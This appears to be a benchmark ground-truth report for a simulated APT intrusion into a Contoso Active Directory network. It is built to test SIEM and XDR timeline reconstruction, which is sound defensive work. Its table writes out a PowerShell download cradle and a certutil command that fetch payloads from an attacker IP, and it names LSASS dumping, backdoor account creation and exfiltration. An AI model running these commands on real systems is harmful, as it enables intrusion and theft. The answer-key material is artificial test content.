@@ -1,0 +1,64 @@
+# FORENSIC BENCHMARK REPORT: CASE 1
+## Case Name: APT Enterprise Intrusion & Lateral Movement
+**Complexity Level:** High  
+**Evaluated Environment:** Enterprise On-Premises Windows Active Directory Infrastructure  
+**Target Domain:** `corp.contoso.com`  
+**Primary Compromised Host:** `WKSTN-FIN-04.corp.contoso.com` (`10.20.10.45`)  
+**Secondary Compromised Host (DC):** `DC01.corp.contoso.com` (`10.20.10.10`)  
+**Threat Actor Infrastructure:** `185.220.101.45` (C2 / Staging), `203.0.113.119` (Phishing Mailer), `198.51.100.240` (Exfiltration Drop)
+
+---
+
+### 1. Executive Summary
+
+Case 1 replicates an advanced persistent threat (APT) multi-stage intrusion emulating techniques associated with sophisticated threat actors (e.g., APT29 / UNC2452). The adversary gains initial foothold through targeted spear-phishing delivering a macro-laced document (`Invoice_90214.docm`). Upon document execution, an obfuscated Base64-encoded PowerShell cradle spawns directly from Microsoft Word to download second-stage payloads via a native Living-off-the-Land Binary (`certutil.exe`). 
+
+Post-exploitation includes in-memory credential harvesting from the Local Security Authority Subsystem Service (`lsass.exe`) using Mimikatz, yielding cleartext Domain Administrator credentials (`da_admin`). Armed with privileged credentials, the actor executes lateral movement across the internal subnet via SMB/RPC, instantiates a remote service (`PSEXESVC`) on the primary Domain Controller (`DC01`), and creates a stealthy persistent backdoor user (`svc_backup_admin`) provisioned into the Builtin `Administrators` group. Simultaneously, the compromised endpoint establishes high-frequency (60-second jitterless) command-and-control (C2) beaconing over non-standard TLS/SSL on port 8443, culminating in high-speed bulk exfiltration of proprietary financial archives (450 MB) to an untrusted external server.
+
+This benchmark dataset evaluates the ability of SIEM, XDR, and automated incident correlation engines to reconstruct the multi-system timeline across disjointed log formats (Email Gateway, Windows Security EVTX, Sysmon Operational, and Palo Alto Firewall CSV) while strictly distinguishing adversarial activity from co-mingled benign enterprise operations and high-volume noise.
+
+---
+
+### 2. Full Attack Kill Chain Timeline
+
+```
+[2026-09-14 10:14:02 UTC]  Initial Access: Phishing email delivered with Invoice_90214.docm
+         │
+[2026-09-14 10:16:32 UTC]  Execution: User opens document; WINWORD.EXE spawns obfuscated PowerShell cradle
+         │
+[2026-09-14 10:17:45 UTC]  Defense Evasion / Ingress Tool: certutil.exe downloads stage2.dll from 185.220.101.45
+         │
+[2026-09-14 10:20:14 UTC]  Credential Access: mimikatz.exe opens lsass.exe (GrantedAccess: 0x1010)
+         │
+[2026-09-14 10:22:15 UTC]  Privilege Escalation / Token: runas.exe invoked for CONTOSO\da_admin
+         │
+[2026-09-14 10:23:05 UTC]  Lateral Movement: Logon Type 3 network SMB authentication to DC01.corp.contoso.com
+         │
+[2026-09-14 10:23:18 UTC]  Execution on DC: Service Control Manager installs PSEXESVC service
+         │
+[2026-09-14 10:25:30 UTC]  Persistence: Backdoor account svc_backup_admin created on DC01
+         │
+[2026-09-14 10:25:32 UTC]  Privilege Escalation: svc_backup_admin added to Builtin Administrators
+         │
+[2026-09-14 10:25:00 UTC]  Command & Control: Outbound beaconing established to 185.220.101.45:8443 (60s cycle)
+         │
+[2026-09-14 10:32:45 UTC]  Exfiltration: 450 MB compressed archive uploaded to 198.51.100.240:443
+```
+
+---
+
+### 3. Ground Truth Table
+
+| Stage # | MITRE ATT&CK ID | Timestamp (UTC) | Source Host / IP | Destination Host / IP | User Account | Executable / Artifact | Command Line / Key Indicator | Severity |
+| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
+| **Stage 1** | **T1566.001** (Spearphishing Attachment) | 2026-09-14 10:14:05 | `203.0.113.119` | `10.20.10.25` / `10.20.10.10` | `jdoe@contoso.com` | `Invoice_90214.docm` | Sender: `billing@overdue-invoices-center.org`, SHA256: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | **High** |
+| **Stage 2** | **T1059.001** (PowerShell Cradle) | 2026-09-14 10:16:32 | `WKSTN-FIN-04` (`10.20.10.45`) | `185.220.101.45:80` | `CONTOSO\jdoe` | `powershell.exe` | Parent: `WINWORD.EXE`. Base64: `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/cobalt.ps1')` | **Critical** |
+| **Stage 3** | **T1105** (LOLBin Tool Transfer) | 2026-09-14 10:17:45 | `WKSTN-FIN-04` (`10.20.10.45`) | `185.220.101.45:80` | `CONTOSO\jdoe` | `certutil.exe` | `certutil.exe -urlcache -split -f http://185.220.101.45/stage2.dll C:\Users\Public\stage2.dll` | **High** |
+| **Stage 4** | **T1003.001** (LSASS Memory Dump) | 2026-09-14 10:20:14 | `WKSTN-FIN-04` (`10.20.10.45`) | Local (`lsass.exe`) | `CONTOSO\jdoe` | `mimikatz.exe` | Target: `lsass.exe`, GrantedAccess: `0x1010` (`PROCESS_VM_READ \| PROCESS_QUERY_LIMITED_INFORMATION`), CallTrace via `ntdll.dll` | **Critical** |
+| **Stage 5** | **T1078.002** (Explicit Credential Logon) | 2026-09-14 10:22:15 | `WKSTN-FIN-04` (`10.20.10.45`) | Local / `DC01` | `CONTOSO\jdoe` -> `da_admin` | `runas.exe` | Windows Event 4648. Process: `C:\Windows\System32\runas.exe`, TargetServer: `DC01.corp.contoso.com` | **High** |
+| **Stage 6** | **T1021.002** (SMB Lateral Movement) | 2026-09-14 10:23:05 | `10.20.10.45` | `DC01` (`10.20.10.10`) | `CONTOSO\da_admin` | Kerberos / SMB | Windows Event 4624 (Logon Type 3) & Event 4672 (`SeDebugPrivilege`, `SeImpersonatePrivilege` assigned) | **Critical** |
+| **Stage 7** | **T1569.002** (PsExec Service Install) | 2026-09-14 10:23:18 | Remote (`WKSTN-FIN-04`) | `DC01` (`10.20.10.10`) | `LocalSystem` | `PSEXESVC.exe` | System Event 7045. Service: `PSEXESVC`, Path: `%SystemRoot%\PSEXESVC.exe` | **Critical** |
+| **Stage 8** | **T1136.001** (Backdoor Account Created) | 2026-09-14 10:25:30 | `DC01` (`10.20.10.10`) | Local SAM / AD | `CONTOSO\da_admin` | `lsass.exe` / SAM | Windows Event 4720. Target: `svc_backup_admin`, DisplayName: `Backup Automation Service` | **Critical** |
+| **Stage 9** | **T1098** (Account Privilege Escalation) | 2026-09-14 10:25:32 | `DC01` (`10.20.10.10`) | Local SAM / AD | `CONTOSO\da_admin` | `lsass.exe` / SAM | Windows Event 4732. Target: `Administrators` (SID: `S-1-5-32-544`), Member: `svc_backup_admin` | **Critical** |
+| **Stage 10** | **T1071.001** (C2 Heartbeat Beaconing) | 2026-09-14 10:25:00 – 10:30:01 | `10.20.10.45` | `185.220.101.45:8443` | `CONTOSO\jdoe` | Network socket | Strict 60s periodic interval (10:25:00, 10:26:01, 10:27:00, 10:28:01, 10:29:00, 10:30:01), 518–526 bytes | **High** |
+| **Stage 11** | **T1048.003** (Exfiltration Over SSL) | 2026-09-14 10:32:45 | `10.20.10.45` | `198.51.100.240:443` | `CONTOSO\jdoe` | Network socket | Palo Alto Traffic Log. 452.8 MB transferred in 145 seconds to foreign destination (`Seychelles`) | **Critical** |
